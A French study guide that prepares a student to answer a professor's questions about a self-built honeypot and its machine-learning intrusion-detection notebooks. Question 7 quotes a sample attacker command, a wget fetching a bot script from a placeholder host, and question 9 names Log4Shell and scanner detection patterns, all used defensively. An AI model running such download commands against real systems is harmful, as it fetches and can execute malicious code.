# Questions du professeur : préparation

Chaque question a quatre parties : **réponse orale** (à mémoriser), **explication technique** (pour comprendre), **preuve dans le projet**, **relance possible**. Niveaux : 🟢 facile, 🟡 moyen, 🔴 difficile, ⚠️ piège.

> Les passages marqués **[À COMPLÉTER PAR AYMEN]** dépendent de ce que *tu* as fait personnellement. Ne les invente pas : remplis-les avec la vérité.

Tous les chiffres viennent de `results/*.json` et de `docs/TEST_REPORT.md`.

---

## A. Compréhension générale

### 1. 🟢 Qu'est-ce que HoneyBadger, en une phrase ?
**Oral :** « C'est un honeypot : de faux serveurs SSH et web qui attirent les attaquants, enregistrent tout ce qu'ils font, classent chaque action selon MITRE ATT&CK et l'affichent en direct sur un tableau de bord. »
**Technique :** deux capteurs (`sshd.py` port 8022, `httpd.py` port 8081) publient des événements sur un bus interne ; un pipeline les enrichit (GeoIP, technique ATT&CK), les stocke dans PostgreSQL et les pousse au tableau de bord par WebSocket.
**Preuve :** `README.md` (schéma), `backend/main.py` (démarrage), démo en direct.
**Relance :** « Pourquoi un faux serveur plutôt qu'analyser les journaux d'un vrai ? » → Un honeypot n'a pas d'utilisateurs légitimes : tout trafic est suspect, donc les données sont propres et on ne risque aucun vrai système.

### 2. 🟢 Quel problème réel résout-il ?
**Oral :** « Les serveurs exposés sur Internet sont attaqués en permanence par des robots. Pour se défendre, il faut savoir ce que font vraiment les attaquants : mots de passe essayés, commandes, fichiers téléchargés. HoneyBadger le montre sans risque. »
**Technique :** l'information collectée (identifiants les plus essayés, URL de malwares, chemins web sondés) sert à renforcer les vrais systèmes : listes de mots de passe interdits, règles de pare-feu, détection.
**Preuve :** panneaux « Top credentials » et « Payloads » du tableau de bord.
**Relance :** « Qui l'utiliserait ? » → Une équipe de sécurité (SOC), un enseignant, des chercheurs.

### 3. 🟢 Pourquoi avoir choisi ce projet ?
**Oral :** [À COMPLÉTER PAR AYMEN : ta vraie raison, par exemple l'intérêt pour la cybersécurité ou le lien entre sécurité et machine learning.]
**Technique :** le projet combine réseau, développement backend, base de données, visualisation et machine learning, ce qui couvre plusieurs compétences du cursus.
**Relance :** « Qu'est-ce que vous avez appris ? » → [À COMPLÉTER PAR AYMEN]

### 4. 🟡 Qu'est-ce qui rend votre solution différente ?
**Oral :** « Trois choses : le honeypot est écrit par l'équipe, sans Cowrie ; chaque événement est classé selon MITRE ATT&CK ; et on a évalué si l'apprentissage automatique peut reconnaître les attaques, avec et sans étiquettes. »
**Technique :** beaucoup de projets étudiants installent Cowrie ou T-Pot. Ici la capture, le bus, le pipeline et le tableau de bord sont écrits par l'équipe. La partie ML relie les résultats au honeypot : quelles informations il devrait enregistrer.
**Preuve :** `README.md` (« Built from scratch. No Cowrie »), `docs/RESULTS_AND_ANALYSIS.md` section 7.
**Relance :** « Pourquoi ne pas utiliser Cowrie ? » → Pour comprendre et maîtriser toute la chaîne ; Cowrie aurait caché l'essentiel du travail.

### 5. 🟡 Quelle partie avez-vous personnellement réalisée ?
**Oral :** [À COMPLÉTER PAR AYMEN. Ce que montre l'historique git : les commits d'Aymen (`aymenmelk`) ajoutent les notebooks d'analyse (`intrusion_analysis.ipynb`, `pair1_attack_classification.ipynb`) et `PROJECT_INDEX.md` (PR #1 et #2, fusionnées par Aziz). Le backend et le tableau de bord viennent des commits de `scriptsl0th` et d'Aziz Dridi. L'objectif 1 a été réalisé avec Meriem.]
**Conseil :** si une partie a été faite avec l'aide d'un outil d'IA, dis-le simplement et montre que tu comprends chaque ligne. Un professeur pose toujours la question suivante.
**Relance :** « Expliquez-moi cette cellule du notebook. » → Prépare les sections 3 et 4 du notebook Pair 1.

---

## B. Architecture et fonctionnement

### 6. 🟢 Décrivez l'architecture.
**Oral :** « Un seul programme Python asynchrone contient les deux capteurs, le pipeline et l'API. Autour : PostgreSQL pour stocker, un tableau de bord React, et Prometheus avec Grafana pour la supervision. Le tout démarre avec docker compose. »
**Technique :** six conteneurs (`docker compose config --services` : postgres, backend, dashboard, prometheus, alertmanager, grafana). Deux bus en mémoire : brut (capteurs → pipeline) et enrichi (pipeline → API).
**Preuve :** `docs/PROJECT_EXPLAINED_FROM_ZERO.md` (schéma), `docker-compose.yml`.
**Relance :** « Pourquoi pas de Kafka ou RabbitMQ ? » → Un seul processus, volume modeste : une file `asyncio` suffit et évite un service de plus.

### 7. 🟡 Que se passe-t-il exactement quand un attaquant tape `wget http://evil.example/bot.sh` ?
**Oral :** « Le faux shell répond comme un vrai wget mais ne télécharge rien. Un événement part sur le bus, le pipeline le classe en T1105, enregistre l'URL, le stocke en base et le pousse au tableau de bord. »
**Technique :** `FakeShell` intercepte `wget`/`curl` → événement avec `payload_url` → `EnrichmentPipeline._process_event()` : GeoIP → `classify()` = T1105 sévérité haute → `PayloadTracker` → insertion dans `events` → bus enrichi → WebSocket.
**Preuve :** démo partie A3 ; `backend/fakeshell.py`, `backend/pipeline.py`.
**Relance :** « Et si le fichier était vraiment dangereux ? » → Il n'est jamais récupéré : le honeypot ne se connecte jamais aux adresses de l'attaquant.

### 8. 🟡 Pourquoi un bus d'événements entre la capture et le traitement ?
**Oral :** « Pour que le piège ne ralentisse jamais. Le capteur dépose l'événement et continue ; si la base est lente, seul le pipeline attend. »
**Technique :** `EventBus.publish()` fait un `put_nowait` dans une `asyncio.Queue` ; un consommateur unique distribue aux abonnés. Un abonné lent ou en erreur n'arrête pas les autres.
**Preuve :** `backend/bus.py`, `backend/tests/test_bus.py`.
**Relance :** « Et si le programme plante, on perd les événements en file ? » → Oui, la file est en mémoire. Pour la production, on utiliserait une file persistante.

### 9. 🟡 Comment l'attaque est-elle classée selon MITRE ATT&CK ?
**Oral :** « Par des règles dans un ordre fixe : téléchargement, exploitation, commande shell, tentative d'identifiants, puis scan. La première règle qui correspond donne la technique. »
**Technique :** `classify()` dans `mitre.py` utilise des tests simples et des expressions régulières (injection SQL, `${jndi:` pour Log4Shell, chemins de scanners comme `/.env`).
**Preuve :** `backend/mitre.py`, `backend/tests/test_mitre.py` (9 tests).
**Relance :** « Pourquoi des règles et pas du ML ? » → Il n'y a pas d'événements HoneyBadger étiquetés pour entraîner un modèle ; les règles sont explicables et testables.

---

## C. Sécurité

### 10. 🟢 Le honeypot est-il dangereux pour la machine qui l'héberge ?
**Oral :** « Non, par conception : le shell est simulé, aucune commande n'est exécutée, aucun fichier n'est téléchargé et la base n'est accessible qu'en local. »
**Technique :** `FakeShell` renvoie des réponses écrites à l'avance ; PostgreSQL est publié sur `127.0.0.1:15432` ; la seule sortie réseau est la géolocalisation des IP.
**Preuve :** `docs/RESPONSIBLE_DISCLOSURE.md`, `docker-compose.yml`.
**Relance :** « Et si quelqu'un trouve une faille dans asyncssh ? » → Le risque existe ; d'où le conteneur et l'exposition limitée aux ports 8022 et 8081.

### 11. 🟡 Stockez-vous les mots de passe des attaquants ?
**Oral :** « Jamais en clair : seulement leur empreinte SHA-256. On peut compter combien de fois un mot de passe est essayé sans le connaître. »
**Technique :** `hash_password()` dans `sshd.py`. Le capteur HTTP hache aussi les mots de passe de formulaire, et masque (`REDACTED`) les paramètres d'URL qui ressemblent à un secret.
**Preuve :** `docs/TEST_REPORT.md` : 0 mot de passe en clair dans un dump complet de la base ; tests `test_password_in_query_string_is_redacted`.
**Relance :** ⚠️ « SHA-256 sans sel, ce n'est pas faible ? » → Oui pour protéger de *vrais* mots de passe ; ici l'objectif est de compter des tentatives sans stocker le texte. Pour aller plus loin : un HMAC avec une clé secrète.

### 12. 🔴 Que se passe-t-il si l'entrée est incorrecte ou malveillante ?
**Oral :** « Chaque événement est validé par un schéma ; l'API refuse les paramètres invalides avec une erreur 400 ; les chemins enregistrés sont limités à 2 048 caractères. »
**Technique :** modèles Pydantic (`schemas.py`) : un événement SSH sans identifiants est refusé ; l'API valide `limit`, `service`, `severity`, `technique`, `since` (test `test_event_filters_and_validation`). On a corrigé un vrai bug : `POST /phpmyadmin` provoquait une erreur 500.
**Preuve :** `backend/schemas.py`, `backend/tests/test_api.py`, `docs/TEST_REPORT.md` bug n° 2.
**Relance :** ⚠️ « Un attaquant peut-il fausser son adresse IP ? » → Oui côté HTTP : le capteur fait confiance à l'en-tête `X-Forwarded-For`. C'est noté comme limite dans le rapport de tests.

---

## D. Données et prétraitement

### 13. 🟢 D'où viennent les données d'apprentissage ?
**Oral :** « D'un jeu public Kaggle, Network Intrusion Detection : 25 192 connexions étiquetées normal ou anomalie, et 22 544 non étiquetées. »
**Technique :** 41 variables de type KDD par connexion. Les tailles correspondent aux fichiers NSL-KDD « 20 % » et « KDDTest+ ». Licence indiquée « Unknown » sur Kaggle, donc les fichiers ne sont pas dans le dépôt ; les notebooks les téléchargent et vérifient leur empreinte SHA-256.
**Preuve :** `docs/RESULTS_AND_ANALYSIS.md` section 1.
**Relance :** « Pourquoi pas les données de votre honeypot ? » → Elles n'ont pas d'étiquettes, et le honeypot n'a pas encore reçu de vrai trafic Internet.

### 14. 🟡 Quelle est la qualité des données ?
**Oral :** « Aucune valeur manquante. Deux colonnes constantes supprimées. Une paire de lignes identiques avec des étiquettes opposées. Les classes sont presque équilibrées : 53 % normal, 47 % attaque. »
**Technique :** 118 lignes du test reprennent une ligne d'entraînement ; les 58 lignes SSH sont toutes des attaques.
**Preuve :** notebook Pair 1, section 2.
**Relance :** « Que faites-vous des doublons ? » → Ils restent, mais les lignes identiques sont toujours du même côté de la séparation entraînement/validation.

### 15. 🟡 Quelles étapes de préparation et pourquoi ?
**Oral :** « Suppression des colonnes constantes, encodage one-hot des trois variables catégorielles, et pour la régression logistique seulement, log puis standardisation, parce que les octets sont très asymétriques. Pas de rééquilibrage : les classes sont presque équilibrées. »
**Technique :** tout est dans un `Pipeline` scikit-learn ajusté sur l'entraînement seulement. Les arbres n'ont pas besoin de mise à l'échelle : ils coupent sur des seuils.
**Preuve :** notebook Pair 1, section 3 (tableau de justification) et 3.1 (données préparées exportées).
**Relance :** « Pourquoi pas SMOTE ? » → Le ratio est de 0,87 ; rééquilibrer ajouterait des exemples artificiels sans bénéfice.

### 16. 🔴 Comment évitez-vous la fuite de données (data leakage) ?
**Oral :** « Trois précautions : les lignes identiques restent du même côté, tout le prétraitement est ajusté sur l'entraînement seulement, et les hyperparamètres sont choisis par validation croisée sur l'entraînement. Les 20 % de validation ne servent qu'une fois. »
**Technique :** `grouped_stratified_folds()` regroupe par vecteur de variables, mélange avec une graine fixe dans chaque classe ; une assertion vérifie qu'aucun vecteur n'est des deux côtés.
**Preuve :** notebook Pair 1, section 3 ; assertion « Feature vectors shared by the two partitions: 0 ».
**Relance :** « Pourquoi ne pas évaluer sur Test_data.csv ? » → Il n'a pas d'étiquettes.

---

## E. Algorithmes et méthodologie

### 17. 🟡 Pourquoi ces modèles ?
**Oral :** « Une référence naïve pour avoir un plancher, la régression logistique pour sa simplicité, l'arbre de décision pour des règles lisibles, et la forêt aléatoire parce qu'elle est en général la plus forte sur des données tabulaires. »
**Technique :** la forêt est robuste aux valeurs extrêmes et n'a pas besoin de mise à l'échelle. Réglages trouvés : C = 10, profondeur 12, `max_features` = 0,3.
**Preuve :** notebook Pair 1, sections 4.1 et 4.2.
**Relance :** « Et XGBoost ? » → Il aurait probablement des résultats proches ; la forêt suffit et reste plus simple à expliquer.

### 18. 🔴 Expliquez la forêt aléatoire.
**Oral :** « C'est un vote de 150 arbres de décision. Chacun apprend sur un échantillon différent des données et des variables ; la prédiction est la majorité des votes. »
**Technique :** le hasard rend les arbres différents ; la moyenne réduit la variance d'un arbre seul. La part des votes « attaque » donne une probabilité, qu'on compare à un seuil.
**Preuve :** notebook Pair 1, section 4.3 (tableau des seuils).
**Relance :** « Comment mesure-t-on l'importance d'une variable ? » → Par la baisse d'impureté qu'elle apporte dans les arbres ; c'est ce qu'utilise le modèle, pas une preuve de cause.

### 19. 🔴 Expliquez la détection d'anomalies (objectif 2).
**Oral :** « On n'entraîne que sur du trafic normal. Le modèle donne un score d'anomalie ; on fixe le seuil pour que 1 % du trafic normal soit signalé, et on regarde quelle part des attaques dépasse ce seuil. »
**Technique :** Isolation Forest (un point rare s'isole en peu de coupes aléatoires), One-Class SVM (frontière autour du normal), LOF (densité locale). Seuil = 99e percentile sur des lignes normales mises de côté (calibration).
**Preuve :** `pair2_anomaly_detection.ipynb`, sections 3 et 4.1.
**Relance :** ⚠️ « Pourquoi LOF échoue-t-il ? » → Il compare la densité d'un point à celle de ses voisins normaux. Les attaques `S0` (SYN flood) tombent près de points normaux eux-mêmes clairsemés : il en rate 100 %.

---

## F. Résultats et évaluation

### 20. 🟢 Quels sont vos résultats ?
**Oral :** « Avec étiquettes, la forêt aléatoire attrape 2 339 attaques sur 2 349, sans fausse alerte. Sans étiquettes, environ 84 % des attaques pour 1 % de fausses alertes. »
**Technique :** Pair 1 : précision 1,000, rappel 0,996, F1 0,998, ROC-AUC 1,000. Pair 2 : One-Class SVM 0,843 de rappel à 1 % de faux positifs, Isolation Forest 0,832.
**Preuve :** `docs/RESULTS_AND_ANALYSIS.md`, `results/*.json`.
**Relance :** « Sur combien de données ? » → 5 039 connexions jamais vues pendant l'entraînement.

### 21. 🟡 Pourquoi pas seulement l'exactitude (accuracy) ?
**Oral :** « Parce qu'elle cache le type d'erreur. Une alarme qui rate une attaque sur dix peut avoir 95 % d'exactitude. On regarde le rappel, la précision et la matrice de confusion. »
**Technique :** la référence naïve a 53 % d'exactitude et n'attrape aucune attaque.
**Preuve :** notebook Pair 1, tableau 4.2.
**Relance :** « Quelle métrique est la plus importante ? » → Le rappel (rater une attaque coûte cher), sous contrainte de fausses alertes rares.

### 22. ⚠️ 99,8 % de F1, c'est trop beau. Comment savez-vous que c'est fiable ?
**Oral :** « Nous ne disons pas que le modèle est excellent dans la réalité. Le score est fiable *sur ce jeu de données* : séparation sans fuite, validation croisée stable à ± 0,0007, résultats reproduits à l'identique sur deux versions des bibliothèques. Mais ce jeu, NSL-KDD, est connu pour être plus facile que le trafic réel. »
**Technique :** beaucoup d'attaques du jeu sont des inondations aux octets et drapeaux TCP très distinctifs. Avec seulement les variables que HoneyBadger sait calculer, le F1 descend à 0,984 ; sans étiquettes, le rappel tombe à 84 %.
**Preuve :** `docs/RESULTS_AND_ANALYSIS.md` section 6 ; `docs/TEST_REPORT.md` section 6 (50/50 vérifications).
**Relance :** « Alors à quoi sert ce score ? » → À montrer la méthode et à savoir quelles informations le honeypot doit enregistrer.

### 23. 🟡 Qu'est-ce qu'un faux positif et un faux négatif ici ?
**Oral :** « Faux positif : une connexion normale signalée comme attaque, ça coûte du temps d'analyste. Faux négatif : une attaque non détectée, c'est le plus grave. »
**Technique :** forêt aléatoire : 0 faux positif, 10 faux négatifs. Le seuil permet d'échanger l'un contre l'autre : à 0,3, 2 faux positifs et 4 faux négatifs.
**Preuve :** notebook Pair 1, section 4.3.
**Relance :** « Quel seuil choisiriez-vous ? » → Pour un SOC qui veut tout voir, 0,3 ; pour éviter toute fausse alerte, 0,5.

### 24. 🔴 Que se passerait-il avec un jeu de données complètement nouveau ?
**Oral :** « Les scores baisseraient sûrement. Il faudrait réentraîner, et surtout vérifier sur des données récentes, avec une séparation dans le temps. »
**Technique :** changement de distribution (dataset shift) : nouveaux services, nouvelles attaques. L'encodeur ignore les catégories inconnues (`handle_unknown='ignore'`) pour ne pas planter, mais le modèle ne les a jamais vues. Le test le montre déjà : un service (`tftp_u`) n'existe que dans le fichier de test.
**Preuve :** notebook Pair 1, section 2.1.
**Relance :** « Et sur les données de HoneyBadger ? » → Les variables ne correspondent pas ; il faut d'abord les calculer par session, puis étiqueter un échantillon.

---

## G. Tests et qualité

### 25. 🟡 Comment avez-vous testé le projet ?
**Oral :** « Quatre niveaux : 97 tests automatiques du backend, dont l'API contre une vraie base PostgreSQL ; 13 scénarios d'attaque contre le système en marche, dont 10 réussissent (les 3 autres dépendent d'une définition à trancher) ; les tests du tableau de bord ; et un script qui relance les notebooks et vérifie 50 résultats. »
**Technique :** avant les corrections, la suite pytest ne s'exécutait même pas (3 erreurs de collecte) ; 7 scénarios sur 13 passaient. Après : 97 tests réussis, 10 scénarios sur 13, zéro erreur du backend.
**Preuve :** `docs/TEST_REPORT.md`.
**Relance :** « Et les 3 scénarios qui échouent ? » → Question suivante.

### 26. ⚠️ Pourquoi trois scénarios échouent-ils encore ?
**Oral :** « Ce ne sont pas des plantages : c'est une question de définition. Le README, le code et les tests ne définissent pas de la même façon la force brute et le credential stuffing. Nous l'avons documenté plutôt que de forcer les tests à passer. »
**Technique :** le test attend T1110 pour un seul utilisateur avec beaucoup de mots de passe ; le code donne T1110.004 dès que le nom d'utilisateur est courant. De plus, la règle T1078 ne peut jamais s'appliquer : toute connexion correspond d'abord à une règle T1110.
**Preuve :** `docs/TEST_REPORT.md`, « Remaining failures ».
**Relance :** « Comment le corrigeriez-vous ? » → Avec un historique par adresse IP : beaucoup de mots de passe pour un même nom = T1110 ; des paires connues sur beaucoup de noms = T1110.004.

### 27. 🔴 Quel a été le défi technique le plus difficile ?
**Oral :** [À COMPLÉTER PAR AYMEN, avec ton vrai vécu. Exemples réels tirés du projet : construire une séparation entraînement/validation sans fuite qui donne exactement le même résultat sur deux versions de scikit-learn ; ou comprendre pourquoi LOF rate toutes les attaques S0.]
**Relance :** « Comment l'avez-vous résolu ? » → Prépare la réponse correspondante.

### 28. 🟡 Quels bugs avez-vous trouvés ?
**Oral :** « En faisant tourner le vrai système, on a trouvé sept bugs : un plantage du pipeline sur chaque téléchargement, une erreur 500 sur phpMyAdmin, des injections SQL perdues parce que la query string n'était pas enregistrée, des connexions HTTP classées comme scans, des poignées de main SSH dans le flux, un graphique vide à cause d'un format d'API, et un simulateur qui ne faisait rien. Tous sont corrigés et couverts par un test. »
**Preuve :** `docs/TEST_REPORT.md`, tableau « Bugs found and fixed » ; `CHANGELOG.md`.
**Relance :** « Comment trouver ce genre de bug plus tôt ? » → Tests de bout en bout dans l'intégration continue.

---

## H. Limites, améliorations, déploiement

### 29. 🟢 Quelles sont les limites du projet ?
**Oral :** « Les scores ML viennent d'un jeu public, pas de notre honeypot ; ce jeu est plus facile que le trafic réel ; il n'y a pas d'exemples SSH normaux ; et le honeypot n'enregistre pas les octets échangés, alors que ce sont les variables les plus utiles. »
**Preuve :** `docs/RESULTS_AND_ANALYSIS.md` section 6.
**Relance :** « Laquelle est la plus grave ? » → Le décalage entre les données d'entraînement et celles du honeypot.

### 30. 🟡 Que feriez-vous avec un mois de plus ?
**Oral :** « Enregistrer les octets et la fin de chaque connexion dans HoneyBadger ; exposer le honeypot sur un vrai serveur pour collecter du trafic ; étiqueter un échantillon ; et évaluer nos modèles dessus, avec une séparation dans le temps. Et terminer l'objectif 3, le regroupement des attaques. »
**Relance :** « Par quoi commenceriez-vous ? » → Les variables manquantes : sans elles, la détection sans étiquettes passe de 84 % à 46 %.

### 31. 🟡 Comment le déploieriez-vous en vrai ?
**Oral :** « Sur un petit serveur cloud, avec seulement les ports 8022 et 8081 ouverts sur Internet ; la base, l'API et le tableau de bord restent privés ; on change le mot de passe de Grafana ; et on surveille les alertes. »
**Technique :** `docker compose up -d`, mot de passe par `HB_GRAFANA_ADMIN_PASSWORD`, accès anonyme désactivé (`HB_GRAFANA_ANONYMOUS=false`), rétention 6 mois par `retention.py`.
**Preuve :** `README.md` section Configuration.
**Relance :** ⚠️ « Est-ce légal de piéger des attaquants ? » → Observer le trafic qui arrive sur sa propre machine est en général permis ; il faut respecter la protection des données (les IP sont des données personnelles) et ne jamais contre-attaquer. Voir `docs/RESPONSIBLE_DISCLOSURE.md`.

### 32. 🔴 Comment passer des résultats Kaggle à HoneyBadger ?
**Oral :** « Calculer par session les variables que le modèle utilise, apprendre le trafic normal sur une période calme avec l'approche de l'objectif 2, puis valider sur un échantillon étiqueté à la main. »
**Technique :** regrouper les événements par adresse IP source et fenêtre de temps (nombre de connexions, services différents, échecs de connexion) ; ajouter les octets et la fin de connexion au capteur.
**Preuve :** notebooks, sections « HoneyBadger-compatible features ».
**Relance :** « Où trouver du trafic normal pour un honeypot ? » → C'est la vraie difficulté : presque tout ce qui touche un honeypot est hostile. On peut utiliser les tests de l'équipe ou des scanners de recherche connus.

### 33. ⚠️ Votre modèle peut-il être contourné par un attaquant ?
**Oral :** « Oui. Un attaquant qui imite le trafic normal, par exemple une requête web qui se termine normalement, passe plus facilement : c'est exactement ce que ratent nos détecteurs sans étiquettes. »
**Technique :** les attaques `SF` (connexions terminées normalement) sont les plus manquées par Isolation Forest et One-Class SVM ; le rappel HTTP n'est que d'environ 51 %.
**Preuve :** `pair2_anomaly_detection.ipynb`, section 4.4.
**Relance :** « Comment se protéger ? » → Combiner plusieurs méthodes : règles, modèle supervisé, détection d'anomalies.

### 34. 🔴 Objectif 3 : comment avez-vous choisi le nombre de groupes, et les familles sont-elles vraies ?
**Oral :** « Aucune métrique n'a de pic net, donc nous avons croisé la méthode du coude, la silhouette et Davies-Bouldin : k = 6 est le plus petit nombre qui sépare les balayages ICMP des floods ICMP. Les groupes sont réels au sens où trois algorithmes différents les retrouvent et ils reviennent à l'identique sur des données jamais vues. Mais les noms d'attaque restent des hypothèses : le jeu ne dit pas le type d'attaque. »
**Technique :** K-Means k = 6 : silhouette 0,568, Davies-Bouldin 0,893 ; ARI ≥ 0,999 entre graines, ≥ 0,94 sur sous-échantillons de 80 %, 0,97 sur la partition de validation. Accord entre K-Means, mélange gaussien et DBSCAN : ARI de 0,90 à 0,97. Le BIC du mélange gaussien ne présente pas de minimum entre 2 et 10, donc il n'a pas servi à choisir k.
**Preuve :** `pair3_attack_profiling.ipynb`, sections 4.2, 4.3, 4.5 et 4.6.
**Relance :** « Pourquoi pas de famille force brute ? » → Seules 11 attaques sur 11 743 ont des échecs de connexion : trop peu pour former un groupe. HoneyBadger garde donc ses règles T1110 dans `backend/mitre.py`.

---

## Les 8 points à absolument maîtriser

1. Le chemin d'un événement : capteur → bus → pipeline → base → API → tableau de bord.
2. Pourquoi aucun mot de passe en clair et aucune commande réelle.
3. Les règles de `classify()` et leur ordre.
4. La différence entre l'objectif 1 (avec étiquettes), l'objectif 2 (sans) et l'objectif 3 (regrouper les attaques en familles).
5. Précision, rappel, F1, matrice de confusion, et pourquoi le rappel compte le plus.
6. Comment la fuite de données est évitée.
7. Pourquoi 99,8 % ne veut pas dire « parfait en vrai ».
8. Les trois scénarios qui échouent encore et pourquoi.
